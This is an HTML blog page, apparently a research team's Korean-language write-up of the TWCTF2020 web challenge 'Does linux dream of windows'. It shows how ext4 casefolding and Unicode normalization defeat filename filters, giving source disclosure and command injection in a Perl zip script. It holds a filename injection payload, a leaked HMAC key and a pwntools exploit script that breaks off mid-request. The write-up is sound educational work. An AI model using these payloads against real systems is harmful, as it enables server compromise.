@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
+  
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>TWCTF2020 Does linux dream of windows | Core-Research-Team</title>
+<meta name="generator" content="Jekyll v4.0.1" />
+<meta property="og:title" content="TWCTF2020 Does linux dream of windows" />
+<meta name="author" content="jskim" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="라온화이트햇 핵심연구팀 김지섭" />
+<meta property="og:description" content="라온화이트햇 핵심연구팀 김지섭" />
+<link rel="canonical" href="http://202.182.127.225:4000/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977" />
+<meta property="og:url" content="http://202.182.127.225:4000/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977" />
+<meta property="og:site_name" content="Core-Research-Team" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-10-01T00:00:00+00:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"TWCTF2020 Does linux dream of windows","dateModified":"2020-10-01T00:00:00+00:00","datePublished":"2020-10-01T00:00:00+00:00","author":{"@type":"Person","name":"jskim"},"url":"http://202.182.127.225:4000/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977","mainEntityOfPage":{"@type":"WebPage","@id":"http://202.182.127.225:4000/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977"},"description":"라온화이트햇 핵심연구팀 김지섭","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">
+
+  <!-- RSS -->
+  <link type="application/atom+xml" rel="alternate" href="http://202.182.127.225:4000/feed.xml" title="Core-Research-Team" />
+
+  <!-- Google Analytics-->
+  
+ 
+</head>
+
+
+  <body>
+
+    <nav class="nav">
+  <div class="nav-container">
+    <a href="/">
+      <h2 class="nav-title">RAON - Core Research Team</h2>
+    </a>
+    <ul>
+      <li><a href="/about">About</a></li>
+      <li><a href="/">Posts</a></li>
+    </ul>
+  </div>
+</nav>
+
+
+    <main>
+      <div class="post"> 
+   <h1 class="post-title">TWCTF2020 Does linux dream of windows</h1>
+   <div class="post-line"></div>
+
+   
+      
+         
+            <span class="tag"><center><i>CTF</i></center></span>
+         
+      
+         
+            <span class="tag"><center><i>Web</i></center></span>
+         
+      
+   
+   
+   <ul>
+  <li><a href="#does-linux-dream-of-windows">Does linux dream of windows?</a>
+    <ul>
+      <li><a href="#prelude">Prelude</a></li>
+      <li><a href="#apache-mod-mono-server">Apache mod-mono-server</a></li>
+      <li><a href="#footprinting">Footprinting</a></li>
+      <li><a href="#casefolding-을-지원하는-ext4의-등장">casefolding 을 지원하는 ext4의 등장(!)</a></li>
+      <li><a href="#casefolding-test">casefolding test</a></li>
+      <li><a href="#flag1">Flag1</a></li>
+      <li><a href="#flag2">Flag2</a></li>
+      <li><a href="#exploit">Exploit</a></li>
+    </ul>
+  </li>
+</ul>
+   
+   <p>라온화이트햇 핵심연구팀 김지섭</p>
+
+<h1 id="does-linux-dream-of-windows">Does linux dream of windows?</h1>
+
+<h2 id="prelude">Prelude</h2>
+
+<p><a href="/assets/dream-9449a15a278f55cec96e2567ac9a040299bcde2632a6ecb7c783a58c00191d80.7z">dream-9449a15a278f55cec96e2567ac9a040299bcde2632a6ecb7c783a58c00191d80.7z</a></p>
+
+<p><a href="/assets/etc-9588be7d02beb61731dcdfd4590e13d1d4ba4a3527d4cb9f6786bde1071a6ed4.tar.gz">etc-9588be7d02beb61731dcdfd4590e13d1d4ba4a3527d4cb9f6786bde1071a6ed4.tar.gz</a></p>
+
+<p><img src="/assets/2010js.png" alt="/assets/2010js.png" /></p>
+
+<p>파일을 업로드하고 업로드한 파일을 리스팅할 수 있는 컨셉의 챌린지입니다. 특이한 기능이라면 기존에 업로드한 파일 이름을 압축(Compress)할 수 있는 기능이 존재했다는 점인데요. 해당 문제는 대회 시간 약 48시간 기준으로 단 1팀의 솔버만을 배출해냈고 이 마저도 unintended solution으로 풀려버린, 꽤 흥미로운 문제였습니다.</p>
+
+<h2 id="apache-mod-mono-server">Apache mod-mono-server</h2>
+
+<p><a href="https://github.com/mono/website/blob/gh-pages/docs/web/mod_mono.md">mono/website</a></p>
+
+<p>해당 문제의 환경은 <code class="highlighter-rouge">Linux + mono-server</code> 입니다. <code class="highlighter-rouge">mono-server</code>는 Apache 웹 엔진과 함께 리눅스에서 <a href="http://asp.NET">ASP.NET</a> 코드를 실행시킬 수 있도록 돕는 모듈이며 실질적으로 <a href="http://asp.net">ASP.NET</a> 을 핸들링하는 역할을 합니다.</p>
+
+<p><img src="/assets/2010js1.png" alt="/assets/2010js1.png" /></p>
+
+<p>위 그림은 mod-mono-server의 동작 과정을 간단하게 요약한 그림입니다. 사용자의 http request가 들어오면 Apache worker 가 해당 요청을 mono-server로 그대로 전달해 줍니다. mod-server는 전달받은 request packet을 실질적으로 처리하고 그에 맞는 response를 다시 apache worker에 전송하여 사용자에게 전달합니다.</p>
+
+<p>따라서 해당 문제 환경은 리눅스임에도 불구하고 mono-server 바이너리를 통해 aspx과 cs(C#)를 실행시킬 수 있었으며, 문제에 주어진 소스코드에서도 aspx와 cs 확장자를 확인할 수 있었습니다.</p>
+
+<p><img src="/assets/2010js2.png" alt="/assets/2010js2.png" /></p>
+
+<h2 id="footprinting">Footprinting</h2>
+
+<p>upload.aspx 의 소스코드는 다음과 같습니다.</p>
+
+<p><img src="/assets/2010js3.png" alt="/assets/2010js3.png" /></p>
+
+<p>해당 INDEX.HTM 를 눌러보면 놀랍게도 index.htm과 같은 결과를 반환합니다. 대회 당시에는 웹 페이지에 적혀있는 INDEX.HTM 이 무엇을 시사하는 지를 단번에 알아채지 못했으나 INDEX.HTM에 접속해도 index.htm 과 같은 결과를 반환한다는 것은 해당 파일 시스템이 case-insensitive 하다는 것을 의미합니다. 물론 윈도우에서 IIS를 통해 aspx를 호스팅 할 때도 case-insensitive하게 파일에 접근할 수 있지만 이는 윈도우 파일시스템이 본디 case-insensitive하기 때문입니다. 👀</p>
+
+<p><img src="/assets/2010js4.png" alt="/assets/2010js4.png" /></p>
+
+<p>case-insensitive한 windows filesystem</p>
+
+<p>따라서 힌트로 제공된 /etc/fstab과 upload.aspx에서 볼 수 있는 대문자 INDEX.HTM 를 통해 /srv/www.img가 /var/www에 ext4로 마운트 되었음을 확인할 수 있고, 이를 통해 저희는 이 /var/www/에 마운트 된 파일 시스템이 case-insensitive 하다는 점을 추측해볼 수 있습니다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LABEL=cloudimg-rootfs	/	 ext4	defaults	0 0
+LABEL=UEFI	/boot/efi	vfat	defaults	0 0
+/srv/www.img /var/www ext4 defaults 0 0
+</code></pre></div></div>
+
+<p>여기서 잠깐….. ext4는 linux의 고유 파일 시스템이며 대소문자를 완벽하게 구별하는 것으로 알고 계셨을텐데요. (cat flag와 cat FLAG는 다름)</p>
+
+<p>이게 대체 어떻게 된 일일까요? 🤔</p>
+
+<h2 id="casefolding-을-지원하는-ext4의-등장">casefolding 을 지원하는 ext4의 등장(!)</h2>
+
+<p><a href="https://kernelnewbies.org/Linux_5.2#Optional_support_for_case-insensitive_names_in_ext4">Linux_5.2 - Linux Kernel Newbies</a></p>
+
+<p>약간의 구글링 끝에 2019년 출시된 Linux 5.2 버전의 Ext4 파일 시스템에서 공식적으로 대소문자를 구분하지 않는, 최적화된 파일 이름을 조회하는 새로운 기능이 추가된 것을 확인할 수 있었습니다. 즉, ext4에서 <code class="highlighter-rouge">casefold</code>를 지원하는 옵션이 추가되었다는 말인데요. 커밋 로그를 잘 읽어보면 다음과 같은 내용이 존재합니다.</p>
+
+<p><a href="https://github.com/torvalds/linux/commit/b886ee3e778ec2ad43e276fd378ab492cf6819b7">ext4: Support case-insensitive file name lookups · torvalds/linux@b886ee3</a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A filesystem that has the casefold feature set is able to configure directories with the +F (EXT4_CASEFOLD_FL) attribute, enabling lookups to succeed in that directory in a case-insensitive fashion, i.e: match a directory entry even if the name used by userspace is not a byte per byte match with the disk name, but is an equivalent case-insensitive version of the Unicode string.  This operation is called a case-insensitive file name lookup.
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">+F</code> 플래그를 통해 디렉토리에 <code class="highlighter-rouge">EXT4_CASEFOLD_FL</code> 속성을 추가해줄 수 있으며, 해당 F 속성이 추가된 디렉터리 내부에서는 대소문자를 구분하지 않는다고 합니다.  하지만 여기서 저희가 주목해야될 점은 바로 <code class="highlighter-rouge">case-insensitive version of unicode string</code> 인데요.</p>
+
+<p>이 사실을 알고난 뒤 문제를 풀이하기 위한 몇 가지 아이디어가 떠올랐습니다.</p>
+
+<h2 id="casefolding-test">casefolding test</h2>
+
+<p>일단 unicode casefolding에 관한 몇 가지 테스트를 진행해야 했습니다. 테스트를 위해 <code class="highlighter-rouge">/var/www/html</code> 경로에 test.php 파일을 생성하고 apache 모듈이 파일시스템의 영향을 받는지를 확인해 봅니다. unicode casefolding 을 테스트하기 위해서 unicode character database에 수록되어있는 casefolding case 중 <code class="highlighter-rouge">st</code>를 나타내는 글자를 찾았습니다.</p>
+
+<p><a href="https://www.unicode.org/Public/12.1.0/ucd/CaseFolding.txt"></a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FB06; F; 0073 0074; # LATIN SMALL LIGATURE ST
+</code></pre></div></div>
+
+<p><img src="/assets/2010js5.png" alt="/assets/2010js5.png" /></p>
+
+<p>그런 다음, test.php가 아닌 <code class="highlighter-rouge">te\ufb06.php</code> 로 접근해봅니다.</p>
+
+<p><img src="/assets/2010js6.png" alt="/assets/2010js6.png" /></p>
+
+<p>when the webserver is mounted on non-casefold file system</p>
+
+<p>일반적인 case-sensitive한 ext4 파일시스템에서는 정상적으로 라우팅이 이루어지지 않습니다. 하지만 casefold 옵션이 켜져있는 ext4 파일시스템은 과연 어떨까요?</p>
+
+<p>테스트를 진행하기 위해 ext4 casefold를 지원하도록 파일 시스템을 마운트한 뒤, chattr 을 통해 html 경로에 +F 옵션을 주어 case-insensitive한 속성을 부여합니다.</p>
+
+<p><img src="/assets/2010js7.png" alt="/assets/2010js7.png" /></p>
+
+<p>그런 다음 똑같이 test.php가 아닌 <code class="highlighter-rouge">te\ufb06.php</code> 로 접근해봅니다.</p>
+
+<p><img src="/assets/2010js8.png" alt="/assets/2010js8.png" /></p>
+
+<p>when the webserver is mounted on ext4 casefold file system</p>
+
+<p>놀랍게도 test.php로 접근이 됩니다. 이 말은 즉,  ext4 casefold 파일시스템에서는 파일 명을 byte per byte로 보지 않고, normalize된 unicode string과 일치하는 파일을 모두 같은 파일로 보겠다는 의미가 됩니다.</p>
+
+<h2 id="flag1">Flag1</h2>
+
+<p>현재 문제에서 제공되는 서버 구성은 다음과 같습니다.</p>
+
+<p><img src="/assets/1.png" alt="/assets/1.png" /></p>
+
+<p>Apache 는 mod_mono_auto.confg 명시되어 있는 확장자를 기준으로 요청을 mono-server 넘겨줍니다.</p>
+
+<p><img src="/assets/2010js9.png" alt="/assets/2010js9.png" /></p>
+
+<p>ucd를 참고하여 upload.aspx 이나 upload.aspx.cs 가 아닌 <code class="highlighter-rouge">upload.a\u017Fpx</code> 이나 <code class="highlighter-rouge">upload.a\u017Fpx.c\u017F</code> 이런 식으로 접근하게 되면 Apache에서는 해당 유니코드를 casefold 한 뒤 매치되는 파일을 골라 라우팅 할 것입니다.</p>
+
+<p>하지만 Apache의 AddType directive 는 unicode가 아닌 오직 ascii 레벨에서의 casefolding을 지원하기 때문에 결과적으로 upload.aspx가 mono-server를 거치지 않고 불려져 upload.aspx의 소스코드를 열람할 수 있게 됩니다.</p>
+
+<p><img src="/assets/2010js10.png" alt="/assets/2010js10.png" /></p>
+
+<h2 id="flag2">Flag2</h2>
+
+<p>파일을 올리고 압축하는 루틴에 command injection 취약점이 존재했습니다. 저희가 입력한 압축할 파일 명 <code class="highlighter-rouge">uploadedFilename</code> 이 $ARGV[0]에 직접적으로 들어가기 때문입니다.</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
+<span class="c1">#/bin/file-compressor</span>
+<span class="k">my</span> <span class="nv">$contentfile</span> <span class="o">=</span> <span class="nv">$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="k">my</span> <span class="nv">$zipfile</span> <span class="o">=</span> <span class="nv">$contentfile</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$zipfile</span> <span class="o">=~</span> <span class="sr">/.*\..*\z/</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$zipfile</span> <span class="o">=~</span> <span class="sr">s/(.*)\..*\z/$1.zip/</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="nv">$zipfile</span> <span class="o">.=</span> <span class="p">"</span><span class="s2">.zip</span><span class="p">";</span>
+<span class="p">}</span>
+<span class="k">print</span> <span class="nv">$zipfile</span><span class="p">;</span>
+<span class="p">`</span><span class="sb">zip "</span><span class="si">$zipfile</span><span class="sb">" "</span><span class="si">$contentfile</span><span class="sb">"</span><span class="p">`;</span> <span class="c1"># &lt;--- here</span>
+</code></pre></div></div>
+
+<p>아래는 upload.aspx.cs의 코드 중 일부분입니다.</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">protected</span> <span class="k">void</span> <span class="nf">button1_OnClick</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">var</span> <span class="n">userDir</span> <span class="p">=</span> <span class="nf">GetUserDir</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(!</span><span class="n">Directory</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">userDir</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">Directory</span><span class="p">.</span><span class="nf">CreateDirectory</span><span class="p">(</span><span class="n">userDir</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(!</span><span class="n">file1</span><span class="p">.</span><span class="n">HasFile</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"No file"</span><span class="p">;</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kt">var</span> <span class="n">filename</span> <span class="p">=</span> <span class="nf">Sanitize</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="nf">GetFileName</span><span class="p">(</span><span class="n">filename1</span><span class="p">.</span><span class="n">Text</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(!</span><span class="nf">SecurityCheck</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Security Error"</span><span class="p">;</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">file1</span><span class="p">.</span><span class="nf">SaveAs</span><span class="p">(</span><span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">userDir</span><span class="p">,</span> <span class="n">filename</span><span class="p">));</span>
+    <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Uploaded: "</span> <span class="p">+</span> <span class="n">filename</span><span class="p">;</span>
+    <span class="n">uploadedFilename</span><span class="p">.</span><span class="n">Value</span> <span class="p">=</span> <span class="n">filename</span><span class="p">;</span>
+    <span class="n">uploadedFilenameTag</span><span class="p">.</span><span class="n">Value</span> <span class="p">=</span> <span class="nf">GenerateHmac</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+    <span class="n">button2</span><span class="p">.</span><span class="n">Enabled</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">protected</span> <span class="k">void</span> <span class="nf">button2_OnClick</span><span class="p">(</span><span class="kt">object</span> <span class="n">sender</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">var</span> <span class="n">filename</span> <span class="p">=</span> <span class="n">uploadedFilename</span><span class="p">.</span><span class="n">Value</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(!</span><span class="nf">VerifyHmac</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">uploadedFilenameTag</span><span class="p">.</span><span class="n">Value</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Security Error"</span><span class="p">;</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">filename</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">"/"</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Security Error"</span><span class="p">;</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kt">var</span> <span class="n">userDir</span> <span class="p">=</span> <span class="nf">GetUserDir</span><span class="p">();</span>
+    <span class="kt">var</span> <span class="n">filepath</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="n">userDir</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="nf">Exists</span><span class="p">(</span><span class="n">filepath</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Security Error: not exists"</span><span class="p">;</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kt">var</span> <span class="n">zipFilename</span> <span class="p">=</span> <span class="nf">CompressFile</span><span class="p">(</span><span class="n">userDir</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+    <span class="n">label1</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="s">"Compressed: "</span> <span class="p">+</span> <span class="n">zipFilename</span><span class="p">;</span>
+
+    <span class="n">File</span><span class="p">.</span><span class="nf">Delete</span><span class="p">(</span><span class="n">filepath</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="p">...</span>
+<span class="k">protected</span> <span class="kt">bool</span> <span class="nf">SecurityCheck</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">string</span> <span class="n">lower</span> <span class="p">=</span> <span class="n">filename</span><span class="p">.</span><span class="nf">ToLower</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".aspx"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".asmx"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".ashx"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".asax"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".ascx"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".soap"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".rem"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".axd"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".cs"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".config"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".dll"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".php"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".phtml"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".shtml"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s">".cgi"</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>$ARGV[0]에 들어가는 인자 값은 최종적으로 compressFile 함수의 <code class="highlighter-rouge">filename</code>으로 들어가게 됩니다. 하지만 upload.aspx.cs 코드에 있는 <code class="highlighter-rouge">Exists()</code> 함수로 인해서 파일명에 <code class="highlighter-rouge">나 .. 같은 특수문자를 입력할 수 없었습니다. 또한 </code>SecurityCheck` 함수로 인해 웹쉘 업로드도 불가능해 보였죠.</p>
+
+<p>하지만 ext4 casefold 파일시스템은 casefold 뿐 만 아니라 normalize 된 파일명을 기준으로 파일명을 비교한다고 말씀드렸었는데요. 이는 ext4 casefold가 공식적으로 Unicode Normalization을 지원한다는 것을 의미합니다. 간단하게 말해서 NFD의 <code class="highlighter-rouge">A\u030a</code>와 NFC의 <code class="highlighter-rouge">\u00c5</code> 를 동등(equivalent) 하게 보겠다는 뜻이 됩니다.</p>
+
+<p><img src="/assets/2010js11.png" alt="/assets/2010js11.png" /></p>
+
+<p><img src="/assets/2010js12.png" alt="/assets/2010js12.png" /></p>
+
+<p>마찬가지로 ascii에 매핑되는 unicode 케이스를 좀 더 조사하기 시작했고, ucd의 <code class="highlighter-rouge">NormalizationTest</code> 에서 shell command로 사용할 수 있을만한 몇 가지 흥미로운 케이스들을 찾을 수 있었습니다.</p>
+
+<p><a href="https://www.unicode.org/Public/12.1.0/ucd/NormalizationTest.txt"></a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>037E;003B;003B;003B;003B; # (;; ;; ;; ;; ;; ) GREEK QUESTION MARK
+1FEF;0060;0060;0060;0060; # (`; `; `; `; `; ) GREEK VARIA
+226E;226E;003C 0338;226E;003C 0338; # (≮; ≮; &lt;◌̸; ≮; &lt;◌̸; ) NOT LESS-THAN
+226F;226F;003E 0338;226F;003E 0338; # (≯; ≯; &gt;◌̸; ≯; &gt;◌̸; ) NOT GREATER-THAN
+</code></pre></div></div>
+
+<p>위에서부터 차례대로 ;, `, &lt;, &gt; 총 네 가지 입니다. 세미콜론을 기준으로 NFC; NFD; NFKC; NFKD 순서이며 위와 마찬가지로 normalize 이후 <code class="highlighter-rouge">\u226e</code>와 <code class="highlighter-rouge">&lt;\u0338</code> 는 동등해질 것입니다. 😉</p>
+
+<p><img src="/assets/2010js13.png" alt="/assets/2010js13.png" /></p>
+
+<p>이제 거의 다 왔습니다!</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>저희는 ;, `, &lt;, &gt;  이렇게 총 4가지 쉘 커맨드를 사용할 수 있게 되었습니다. 이 4 가지 쉘 커맨드로 어떻게 쉘 명령어를 실행시킬 수 있을 지 몇 가지 테스트를 해봤는데요. 최종적으로 다음과 같은 페이로드를 통해 쉘 명령어 실행이 가능했습니다.</p>
+
+<p><img src="/assets/2010js14.png" alt="/assets/2010js14.png" /></p>
+
+<p>먼저 a에 실행시키고 싶은 쉘 명령어를 입력한 다음, sh에 리다이렉션 기호를 통해 a를 입력으로 주고, 그 다음 나온 아웃풋을 b로 주게 되면 명령어 실행이 가능합니다.</p>
+
+<p>따라서 Exploit 시나리오는 다음과 같습니다.</p>
+
+<ol>
+  <li>실행할 명령어를 담은 파일을 만들고 <code class="highlighter-rouge">\u0338a</code> 이라는 이름으로 업로드</li>
+  <li><code class="highlighter-rouge">\u1FEFsh\u226Ea\u226Fb\u1FEF</code> 라는 dummy 파일 업로드</li>
+  <li><code class="highlighter-rouge">sh&lt;\u0338a&gt;\u0338b</code> 압축</li>
+</ol>
+
+<p><img src="/assets/2010js15.png" alt="/assets/2010js15.png" /></p>
+
+<p>파일명을 <code class="highlighter-rouge">\u1FEFsh\u226Ea\u226Fb\u1FEF</code> 로 업로드하게 되면, unicode normalization로 인해 <code class="highlighter-rouge">sh&lt;\u0338a&gt;\u0338b</code> 도 동등하게 접근할 수 있게 되어, 압축할 때 <code class="highlighter-rouge">sh&lt;\u0338a&gt;\u0338b</code> 파일을 인자로 주게되면 최종적으로 다음과 같은 perl 스크립트가 완성됩니다.</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">zip</span> <span class="p">"</span><span class="s2">`sh&lt;</span><span class="err">\</span><span class="s2">u0338a&gt;</span><span class="err">\</span><span class="s2">u0338b`.zip</span><span class="p">"</span> <span class="p">"</span><span class="s2">`sh&lt;</span><span class="err">\</span><span class="s2">u0338a&gt;</span><span class="err">\</span><span class="s2">u0338b`</span><span class="p">"</span>
+</code></pre></div></div>
+
+<p>하지만 압축된 파일명을 조작하기 위해서는 hmac key가 필요한데, 다행히 1번 취약점을 통해 손쉽게 hmac key를 추출해낼 수 있었습니다.</p>
+
+<blockquote>
+  <blockquote>
+    <p>hmac : <code class="highlighter-rouge">5af42f71a1b864b7d2093336013508f8</code></p>
+  </blockquote>
+</blockquote>
+
+<p>그 이후, 1번 취약점으로 얻은 hmac을 통해 원하는 파일 명을 file-decompressor의 $ARGV[0] 에 줄 수 있었고, 따라서 command injection 취약점을 발현시킬 수 있었습니다.</p>
+
+<p>다음은 Exploit 코드입니다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'dream.chal.ctf.westerns.tokyo'</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">u'''POST /upload.aspx HTTP/1.1
+Host: dream.chal.ctf.westerns.tokyo
+Connection: keep-alive
+Content-Length: 1700
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://dream.chal.ctf.westerns.tokyo
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZiSaf9FJ6PtAeIM5
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://dream.chal.ctf.westerns.tokyo/upload.aspx
+Accept-Encoding: gzip, deflate
+Accept-Language: ko,en-US;q=0.9,en;q=0.8,ko-KR;q=0.7
+Cookie: ASP.NET_SessionId=AEDE0033A82E6358B8C052CA
+
+------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
+Content-Disposition: form-data; name="__VIEWSTATE"
+
